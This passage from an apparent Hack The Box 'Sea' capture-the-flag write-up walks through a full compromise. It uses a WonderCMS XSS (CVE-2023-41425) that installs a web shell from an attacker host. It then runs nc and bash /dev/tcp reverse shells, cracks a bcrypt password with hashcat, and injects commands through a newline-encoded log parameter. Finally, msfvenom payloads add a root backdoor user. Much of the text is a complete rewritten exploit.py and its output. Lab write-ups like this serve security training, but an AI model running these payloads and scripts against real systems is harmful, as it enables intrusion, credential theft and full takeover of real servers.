= new URL(urlWithoutLog).pathname; \nvar token = document.querySelectorAll('[name=\"token\"]')[0].value;\nvar urlRev = \"http://sea.htb/?installModule=http://10.10.16.25:8000/shelly.zip&amp;directoryName=violet&amp;type=themes&amp;token=\" + token;\nvar xhr3 = new XMLHttpRequest();\nxhr3.withCredentials = true;\nxhr3.open(\"GET\", urlRev);\nxhr3.send();\n'''\n&lt;--SNIP--&gt;\n</code></pre> <ul> <li>We change the <code>urlRev</code> variable to install a module that is hosted on our attack host. We also specify <code>http://sea.htb</code> instead of the variables the PoC uses, since it is a bit unstable in working otherwise.</li> <li>Since we do not launch a reverse shell, we can just delete everything after the <code>xhr3.send()</code> function call.</li> </ul> <p>If you do decide to go the direct reverse shell route, make sure to also change the <code>xhr4.open(\"GET\", \"http://sea.htb/themes/shelly/shelly.php\");</code> as well as the <code>xhr5.open(\"GET\", \"http://sea.htb/themes/shelly/shelly.php?lhost=\" + ip + \"&amp;lport=\" + port);</code></p> <p>Now we can actually run it to generate the <code>xss.js</code> file, start the web server and to get our XSS payload.</p> <pre><code>$ python3 exploit.py http://sea.htb/loginURL 10.10.16.25 7777\n[+] xss.js is created\n[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp 7777\n----------------------------\n\nsend the below link to admin:\n\n----------------------------\nhttp://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8080/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"\n----------------------------\n\n\nstarting HTTP server to allow the access to xss.js\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n</code></pre> <p>The only thing left now is to trigger the XSS payload.</p> <p>During our previous enumeration on <code>/contact.php</code>, we know someone is visiting the URL we provide in the <code>Website</code> field of the contact form. We choose this to place our reflected XSS payload (<code>http://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8080/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"</code>).</p> <p></p> <p>After some time we get a hit on the web server the exploit has started: <pre><code>&lt;--SNIP--&gt;\nstarting HTTP server to allow the access to xss.js\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.129.194.205 - - [21/Nov/2024 14:50:25] \"GET /xss.js HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:34] \"GET /shelly.zip HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:34] \"GET /shelly.zip HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:34] \"GET /shelly.zip HTTP/1.1\" 200 -\n10.129.194.205 - - [21/Nov/2024 14:50:35] \"GET /shelly.zip HTTP/1.1\" 200 -\n</code></pre></p> <p>Next we can access the uploaded web shell using curl on <code>http://sea.htb/themes/shelly/shelly.php</code>.</p> <pre><code>$ curl -s 'http://sea.htb/themes/shelly/shelly.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ curl -s 'http://sea.htb/themes/shelly/shelly.php?cmd=hostname'\nsea\n</code></pre> <p>We can now also get a reverse shell by choosing any Linux binary that is able to do so and issue it using our web shell. I'm choosing <code>nc</code> here.</p> <pre><code>$ curl -s 'http://sea.htb/themes/shelly/shelly.php?cmd=which+nc'\n/usr/bin/nc\n\n$ curl -s 'http://sea.htb/themes/shelly/shelly.php' --get --data-urlencode \"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.25 7777 &gt;/tmp/f\"\n</code></pre> <p>Before we run the above command, we of course set up our listener. Then after running the command we successfully catch the reverse shell connection on our listener as <code>www-data</code> user:</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.194.205] 39684\nbash: cannot set terminal process group (1135): Inappropriate ioctl for device\nbash: no job control in this shell\n\nwww-data@sea:/var/www/sea/themes/shelly$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@sea:/var/www/sea/themes/shelly$ hostname\nsea\n</code></pre> <p>I decided to rewrite the <code>PoC</code> script a bit, allowing to adjust the web server IP and port as well as simplifying the payload to a simple PHP web shell that is generated by the script itself. The script also provides the web shell location in order to execute commands and provides an example command for Linux in order to get a reverse shell connection.</p> <p>The script can also be found on my GitHub.</p> exploit.py<pre><code>import requests\nimport argparse\nfrom argparse import RawTextHelpFormatter\nimport os\nimport subprocess\nimport zipfile\nfrom termcolor import colored\n\ndef main():\nparser = argparse.ArgumentParser(description=\"Exploit Wonder CMS v3.2.0 - v3.4.2 XSS to RCE (CVE-2023-41425)\\nInitial CVE and proof-of-concept by prodigiousMind\\nRewritten by xpltive\", formatter_class=RawTextHelpFormatter)\nparser.add_argument(\"--url\", required=True, help=\"Target URL of loginURL (Example: http://sea.htb/loginURL)\")\nparser.add_argument(\"--xip\", required=True, help=\"IP for HTTP web server that hosts the malicious .js file\")\nparser.add_argument(\"--xport\", required=True, help=\"Port for HTTP web server that hosts the malicious .js file\")\nargs = parser.parse_args()\n\ntarget_login_url = args.url\ntarget_split = args.url.split('/')\ntarget_url = target_split[0] +  '//' + target_split[2]\n\n# Web Shell\nprint(\"[+] Creating PHP Web Shell\")\nif not os.path.exists('malicious'):\n        os.mkdir('malicious')\n        with open ('malicious/malicious.php', 'w') as f:\n        f.write('&lt;?php system($_GET[\"cmd\"]); ?&gt;')\n        with zipfile.ZipFile('./malicious.zip', 'w') as z:\n        z.write('malicious/malicious.php')\n        os.remove('malicious/malicious.php')\n        os.rmdir('malicious')\nelse:\n        print(colored(\"[!] Directory malicious already exists!\", 'yellow'))\n\n# Malicious .js\njs = f'''var token = document.querySelectorAll('[name=\"token\"]')[0].value;\nvar module_url = \"{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&amp;directoryName=pwned&amp;type=themes&amp;token=\" + token;\nvar xhr = new XMLHttpRequest();\nxhr.withCredentials = true;\nxhr.open(\"GET\", module_url);\nxhr.send();'''\n\nprint(\"[+] Writing malicious.js\")\nwith open('malicious.js', 'w') as f:\n        f.write(js)\n\n\nxss_payload = args.url.replace(\"loginURL\", \"index.php?page=loginURL?\")+\"\\\"&gt;&lt;/form&gt;&lt;script+src=\\\"http://\"+args.xip+\":\"+args.xport+\"/malicious.js\\\"&gt;&lt;/script&gt;&lt;form+action=\\\"\"\nprint(\"[+] XSS Payload:\")\nprint(colored(f\"{xss_payload}\", 'red'))\n\nprint(\"[+] Web Shell can be accessed once .zip file has been requested:\")\nprint(colored(f\"{target_url}/themes/malicious/malicious.php?cmd=&lt;COMMAND&gt;\", 'red'))\nprint(\"[+] To get a reverse shell connection run the following:\")\nprint(colored(f\"curl -s '{target_url}/themes/malicious/malicious.php' --get --data-urlencode \\\"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'\\\" \", 'yellow'))\n\nprint(\"[+] Starting HTTP server\")\nsubprocess.run([\"python3\", \"-m\", \"http.server\", \"-b\", args.xip, args.xport])\n\nif __name__ == \"__main__\":\nmain()\n</code></pre> <p>For exploitation, we follow some of the same steps as with the proof-of-concept RCE tab.</p> <p>First we validate that the <code>loginURL</code> can be accessed via <code>http://sea.htb/loginURL</code>, which is successful. </p> <p>With having the <code>loginURL</code> path, we can now run the exploit.</p> <pre><code>$ python3 exploit.py --url http://sea.htb/loginURL --xip 10.10.16.25 --xport 8888\n[+] Creating PHP Web Shell\n[+] Writing malicious.js\n[+] XSS Payload:\nhttp://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8888/malicious.js\"&gt;&lt;/script&gt;&lt;form+action=\"\n[+] Web Shell can be accessed once .zip file has been requested:\nhttp://sea.htb/themes/malicious/malicious.php?cmd=&lt;COMMAND&gt;\n[+] To get a reverse shell connection run the following:\n[+] curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'\" \n[+] Starting HTTP server\nServing HTTP on 10.10.16.25 port 8888 (http://10.10.16.25:8888/) ...\n</code></pre> <p>During our previous enumeration on <code>/contact.php</code>, we know someone is visiting the URL we provide in the <code>Website</code> field of the contact form. We choose this to place our reflected XSS payload provided by the script (<code>http://sea.htb/index.php?page=loginURL?\"&gt;&lt;/form&gt;&lt;script+src=\"http://10.10.16.25:8080/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\"</code>).</p> <p></p> <p>After some time we will get hits on the web server started by the script. Once the <code>.zip</code> files have been requested by the victim, the malicious module is most likely installed.</p> <pre><code>Serving HTTP on 10.10.16.25 port 8888 (http://10.10.16.25:8888/) ...\n&lt;--REDACTED--&gt;  \"GET /malicious.js HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n&lt;--REDACTED--&gt;  \"GET /malicious.zip HTTP/1.1\" 200 -\n</code></pre> <p>We confirm successful code execution by using <code>curl</code> on the command execution path provided by the script.</p> <pre><code>$ curl -s 'http://sea.htb/themes/malicious/malicious.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>To aid in easier enumeration we establish a reverse shell connection by first starting our listener and then running the command the script suggests. </p> <pre><code>$ curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.25/7777 0&gt;&amp;1'\"\n</code></pre> <p>And we get a successful connection on the listener.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.194.205] 54398\nbash: cannot set terminal process group (1135): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@sea:/var/www/sea/themes/malicious$\n</code></pre>"}, {"location": "Write-Ups/Sea/#host-enumeration", "title": "Host Enumeration", "text": "<p>After obtaining the shell, we enumerate the web directory <code>/var/www/sea</code>. Eventually we will find an interesting database file <code>database.js</code> at <code>/var/www/sea/data/database.js</code>. This file contains what seems to be the password (in hash format) needed to authenticate at the previously discovered web page <code>/loginURL</code>.</p> <pre><code>www-data@sea:/var/www/sea/data$ cat database.js                                 \n{                         \n    \"config\": {\n        \"siteTitle\": \"Sea\",\n        \"theme\": \"bike\",\n        \"defaultPage\": \"home\",\n        \"login\": \"loginURL\",\n        \"forceLogout\": false,\n        \"forceHttps\": false,\n        \"saveChangesPopup\": false,\n        \"password\": \"$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\\/D.GuE4jRIikYiWrD3TM\\/PjDnXm4q\",\n        \"lastLogins\": {\n&lt;--SNIP--&gt;\n</code></pre> <p>We can try to crack it using <code>Hashcat</code>. The hash is in <code>bcrypt</code> format, since it starts with <code>$2y$</code>. However to do so successfully we need to delete the backslash escape characters <code>\\</code>.</p> <pre><code>$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q\n</code></pre> <p>Now we can now run <code>Hashcat</code> on the above hash using mode 3200:</p> <pre><code>$ ./hashcat hashes/sea/db-bcrypt.hash rockyou.txt -m 3200\n\n&lt;--SNIP--&gt;\nDictionary cache built:\n* Filename..: rockyou.txt\n* Passwords.: 14344392\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n* Runtime...: 1 sec\n\n$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance\n</code></pre> <p>The password successfully cracks and is revealed as <code>mychemicalromance</code>.</p> <p>Since we don't have a username this password matches to we will enumerate the users present on the host and try for password re-use.</p> <pre><code>$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\namay:x:1000:1000:amay:/home/amay:/bin/bash\ngeo:x:1001:1001::/home/geo:/bin/bash\n</code></pre> <p>There are two users other than root present. We can successfully authenticate as user <code>amay</code> using the cracked password.</p> <pre><code>$ su amay\nsu amay\nPassword: mychemicalromance\nid\nuid=1000(amay) gid=1000(amay) groups=1000(amay)\n</code></pre> <p>Also successfully get authenticated using SSH present on the host, so we choose the SSH shell.</p> <pre><code>$ ssh amay@sea.htb\namay@sea:~$ id\nuid=1000(amay) gid=1000(amay) groups=1000(amay)\n</code></pre> <p>The user flag can be found inside the home directory <code>/home/amay/user.txt</code> of user <code>amay</code>.</p> <pre><code>$ cat user.txt\ne6c73989c9c921993de4435bf53b5a4d\n</code></pre>"}, {"location": "Write-Ups/Sea/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>Doing some usual manual enumeration (before going to automated tools) we eventually find something interesting by enumerating the listening ports of the <code>localhost</code> using <code>netstat</code>.</p> <pre><code>$ netstat -lnpt\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:60755         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -\n</code></pre> <p>Port <code>8080/TCP</code> is open on <code>127.0.0.1</code>. We will take a look at this, however need to forward the port to our attack machine first. Since we already have SSH authentication, I chose to do it using SSH.</p> <pre><code>$ ssh -N -L 8888:127.0.0.1:8080 amay@sea.htb\n</code></pre> <p>Tip</p> <p>The <code>-N</code> flag can be used to not start a login shell, thus we can just run this command in some other console tab to successfully forward the port.</p> <p>We navigate to the port (here <code>8888/TCP</code>) on our attack machine.</p> <p><code>http://127.0.0.1:8888/</code> </p> <p>We get a <code>Basic HTTP Auth</code> login prompt. Using the credentials we have discovered previously - <code>amay:mychemicalromance</code> - we can successfully authenticate.</p> <p></p> <p>Trying the functionalities present, we seem to be able to perform tasks using system commands. This indicates to me that there might be a command injection vulnerability, so we analyze some traffic sent using <code>BurpSuite</code>.</p> <p>Looking at the POST data sent for analyzing the file, we can see a parameter specifying the file.</p> <pre><code>POST / HTTP/1.1\nHost: 127.0.0.1:8888\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://127.0.0.1:8888/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\nOrigin: http://127.0.0.1:8888\nAuthorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==\nConnection: keep-alive\nCookie: csrftoken=xwkilhztwCiavQ8QsErajukQFlV2dA7I; default-theme=ngax\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\n\nlog_file=%2Fvar%2Flog%2Fauth.log&amp;analyze_log=\n</code></pre> <p>Trying around manually using some common command injection characters, we can successfully achieve command injection using the <code>\\n</code> character URL encoded to <code>%0a</code> in the <code>log_file</code> parameter.</p> <pre><code>log_file=%0a+id+%0a&amp;analyze_log=\n</code></pre> <p>We catch the request when clicking on <code>Analyze</code> and modify the POST data to the above payload. We get the following output on the page, successfully confirming command injection as <code>root</code>.</p> <p></p> <p>We will exploit this by adding a backdoor in form of a <code>root</code> user. For this we use <code>msfvenom</code> to generate a malicious <code>.elf</code> file that does this for us.</p> <pre><code>$ msfvenom -p linux/x86/adduser USER=xpltive PASS=xpltive -f elf -o escalate.elf\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 94 bytes\nFinal size of elf file: 178 bytes\nSaved as: escalate.elf\n</code></pre> <p>We copy it over using <code>scp</code>:</p> <pre><code>$ scp ./escalate.elf amay@sea.htb:/tmp/escalate.elf\n</code></pre> <p>And we make it executable using the <code>amay</code> user's SSH connection we have established previously.</p> <pre><code>amay@sea:/tmp$ chmod +x /tmp/shelly.elf\n</code></pre> <p>Next we run the <code>.elf</code> as <code>root</code> by exploiting the command injection vulnerability. We send the following request with the payload launching the <code>.elf</code> file using BurpSuite (or using curl, etc.):</p> <pre><code>POST / HTTP/1.1\nHost: 127.0.0.1:8888\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://127.0.0.1:8888/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 55\nOrigin: http://127.0.0.1:8888\nAuthorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==\nConnection: keep-alive\nCookie: csrftoken=xwkilhztwCiavQ8QsErajukQFlV2dA7I; default-theme=ngax\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\n\nlog_file=%0a+/tmp/./escalate.elf%0a&amp;analyze_log=\n</code></pre> <p>After running it on the <code>amay</code> SSH shell we can now successfully login as <code>xpltive</code> and can confirm the new user also being <code>root</code>.</p> <pre><code>amay@sea:/tmp$ su xpltive\nPassword: \n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>The root flag can be found at <code>/root/root.txt</code>.</p> <pre><code># cat /root/root.txt\n6e1925471aaa72144d541d1f346919df\n</code></pre>"}, {"location": "Write-Ups/Sea/#rabbit-hole-reverse-shell", "title": "Rabbit Hole: Reverse Shell", "text": "<p>Failure</p> <p>This shows a failed attempt to get a reverse shell connection, which was not possible. Can potentially cost a lot of time trying, ultimately not getting it to work.</p> <p>We could also try the privilege escalation by establishing a reverse shell connection as <code>root</code> user. To do so we first create a malicious <code>.elf</code> file which serves as establishing the connection to our listener. We use <code>msfvenom</code> for it.</p> <pre><code>$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.25 LPORT=7777 -f elf -o shelly.elf\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 68 bytes\nFinal size of elf file: 152 bytes\nSaved as: shelly.elf\n</code></pre> <p>Next we copy the malicious binary over to the <code>/tmp</code> folder of the target host using <code>scp</code>.</p> <pre><code>$ scp ./shelly.elf amay@sea.htb:/tmp/shelly.elf\n</code></pre> <p>Before launching the attack, we need to add execute rights to the binary using our previously established SSH connection as <code>amay</code>:</p> <pre><code>amay@sea:/tmp$ chmod +x /tmp/shelly.elf\n</code></pre> <p>Now we start our listener and we can execute the <code>.elf</code> file via the command execution vulnerability.</p> <pre><code>log_file=%0a+/tmp/./shelly.elf%0a&amp;analyze_log=-alid\n</code></pre> <p>We successfully catch the reverse shell, however it will exit after a few seconds.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.194.205] 42664\nbash: cannot set terminal process group (15376): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@sea:/root/monitoring# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@sea:/root/monitoring# exit\n</code></pre> <p>This is probably due to the process that we ultimately do the command injection with exiting on the target host.</p>"}, {"location": "Write-Ups/Sea/#references", "title": "References", "text": "<ul> <li>Gist post on <code>WonderCMS</code> 3.2.0 - 3.4.2 XSS vulnerability: https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413</li> <li>PoC exploit for <code>WonderCMS</code> XSS: https://github.com/prodigiousMind/CVE-2023-41425</li> </ul>"}]}